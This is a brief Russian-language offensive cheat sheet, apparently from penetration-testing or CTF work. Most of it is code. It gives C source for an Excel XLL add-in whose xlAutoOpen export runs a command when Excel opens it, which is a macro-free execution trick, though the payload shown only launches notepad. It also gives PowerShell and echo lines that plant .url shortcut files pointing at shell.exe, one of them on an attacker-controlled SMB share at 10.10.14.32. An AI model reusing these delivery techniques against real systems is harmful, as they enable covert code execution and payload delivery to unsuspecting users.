# Файл для запуска в exel без макроса

https://gist.github.com/projectboot/a0308688abcb1f318a0b00b33698e782

	// Compile with: cl.exe notepadXLL.c /LD /o notepad.xll or x86_64-w64-mingw32-gcc xll.c -shared -o test.xll
	#include <Windows.h>

	__declspec(dllexport) void __cdecl xlAutoOpen(void); 

	void __cdecl xlAutoOpen() {
    // Triggers when Excel opens
    WinExec("cmd.exe /c notepad.exe", 1);
	}

	BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
	{
		switch (ul_reason_for_call)
		{
		case DLL_PROCESS_ATTACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
		}
		return TRUE;
	}




# Создание URL ярлыка
	--->`n - новая строка

	$shortcut = "[InternetShortcut]`nURL=c:\programdata\shell.exe"
	Set-Content -Path "c:\inetpub\testing\test.url" -value $shortcut


	cd C:\inetpub\testing
	echo "[internetshortcut]`nurl=\\10.10.14.32\exploit\shell.exe" > shell.url
